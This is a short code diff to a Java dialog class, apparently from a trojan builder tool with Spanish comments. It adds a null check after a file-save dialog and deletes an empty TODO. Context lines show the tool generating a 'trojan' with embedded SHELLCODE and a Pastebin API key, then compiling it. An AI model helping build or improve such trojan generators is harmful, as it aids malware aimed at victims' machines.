@@ -68,6 +68,7 @@ public class Build extends JDialog {
 			        File file = new File(path);     // Abrimos en un File la ruta
 			        fileChooser.setCurrentDirectory(file);  // Y establemos al selector de archivos la ruta inicial como la actual
 			        fileChooser.showSaveDialog(me);   // Abrimos la ventana para GUARDAR
+			        if(fileChooser.getSelectedFile() == null) return;
 			        
 			        Pattern raw_dot_pattern = Pattern.compile(Pattern.quote("."));  // Creamos un patrón para dividir Strings mediante el punto
 			        String output_dots[] = raw_dot_pattern.split(fileChooser.getSelectedFile().getAbsolutePath());  // Dividimos el archivo seleccionado en un array de Strings
@@ -162,8 +163,6 @@ public class Build extends JDialog {
 			        	if(!MerCodeBin.generate(trojan, SHELLCODE, PastebinAPIDevKey)) {
 			        		return;
 			        	}
-			        	
-			        	// TODO
 			        }
 			        
 			        COMPILAR(trojan.getAbsolutePath()); // Compilamos el código generado
